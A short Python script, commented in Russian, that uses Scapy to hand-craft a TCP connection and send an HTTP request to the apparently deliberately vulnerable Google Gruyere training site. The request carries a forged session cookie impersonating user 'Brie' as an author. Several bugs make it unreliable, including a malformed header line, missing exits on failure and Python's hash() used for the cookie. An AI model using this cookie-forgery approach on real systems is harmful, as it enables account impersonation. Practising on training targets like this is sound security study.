import socket
import random
import time

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr1, send



def resolve_hostname(hostname):
    """Разрешает доменное имя в IP-адрес."""
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror as e:
        print(f"Ошибка разрешения доменного имени '{hostname}': {e}")
        return None




hostname = "google-gruyere.appspot.com"
path = "/621214938579572901982611939206054386999/newsnippet2?snippet=try_this"

"""Отправляет HTTP-запрос через Scapy."""
dest_ip = resolve_hostname(hostname)
if not dest_ip:
    print("No ip")

port = 80
client_sport = random.randint(1025, 65500)

http_request_str = f'GET {path} HTTP/1.1\r\nHost: {hostname}\r\nConnection: close\r\n Cookie: GRUYERE={hash("Brie|author")}|Brie|author; GRUYERE_ID=621214938579572901982611939206054386999\r\n\r\n'

# Устанавливаем TCP-соединение
syn = IP(dst=dest_ip) / TCP(sport=client_sport, dport=port, flags='S')
syn_ack = sr1(syn, timeout=5, verbose=False)

if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 0x12:
    print(f"Не удалось установить соединение с {hostname}")

# Отправляем ACK
client_seq = syn_ack[TCP].ack
client_ack = syn_ack[TCP].seq + 1
ack_packet = IP(dst=dest_ip) / TCP(
    sport=client_sport,
    dport=port,
    seq=client_seq,
    ack=client_ack,
    flags='A'
)
send(ack_packet, verbose=False)

time.sleep(0.1)

# Отправляем HTTP-запрос
http_request = IP(dst=dest_ip) / TCP(
    sport=client_sport,
    dport=port,
    seq=client_seq,
    ack=client_ack,
    flags='PA'
) / http_request_str

send(http_request, verbose=True)

